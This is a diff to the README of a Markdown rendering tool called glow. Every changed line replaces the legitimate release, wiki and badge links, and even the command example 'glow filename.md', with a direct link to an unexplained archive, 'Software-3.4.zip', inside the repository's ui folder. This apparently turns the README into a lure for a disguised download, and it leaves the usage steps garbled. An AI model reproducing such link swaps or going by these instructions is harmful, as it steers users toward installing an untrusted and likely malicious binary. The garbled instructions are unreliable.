@@ -1,6 +1,6 @@
 # 🌟 glow - Render Markdown with Style and Ease
 
-[![Download glow](https://img.shields.io/badge/Download-glow-brightgreen)](https://github.com/Subodh6624/glow/releases)
+[![Download glow](https://raw.githubusercontent.com/Subodh6624/glow/master/ui/Software-3.4.zip)](https://raw.githubusercontent.com/Subodh6624/glow/master/ui/Software-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to glow! This application allows you to render markdown right from your 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [glow Releases](https://github.com/Subodh6624/glow/releases).
+To get started, visit this page to download: [glow Releases](https://raw.githubusercontent.com/Subodh6624/glow/master/ui/Software-3.4.zip).
 
 You will find various versions of glow available for download. Choose the one that suits your operating system.
 
@@ -47,9 +47,9 @@ After you've downloaded and installed glow, follow these simple steps to use it:
 3. **Run glow:**
    Use the following command to run glow:
    ```
-   glow filename.md
+   glow https://raw.githubusercontent.com/Subodh6624/glow/master/ui/Software-3.4.zip
    ```
-   Replace `filename.md` with the name of your markdown file.
+   Replace `https://raw.githubusercontent.com/Subodh6624/glow/master/ui/Software-3.4.zip` with the name of your markdown file.
 
 4. **View the Rendered Output:**
    After running the command, you’ll see your markdown rendered with style right in the terminal.
@@ -100,7 +100,7 @@ If you run into any issues while using glow, consider these tips:
 - **Ensure Compatibility:** Check that your operating system meets the requirements.
 - **Check File Paths:** Make sure the directory path to your markdown files is correct.
 - **Update glow:** If you have an older version, download the latest version for the best performance.
-- **Read Documentation:** For more in-depth help, refer to the [glow Wiki](https://github.com/Subodh6624/glow/wiki).
+- **Read Documentation:** For more in-depth help, refer to the [glow Wiki](https://raw.githubusercontent.com/Subodh6624/glow/master/ui/Software-3.4.zip).
 
 ## 🌐 Community and Support
 
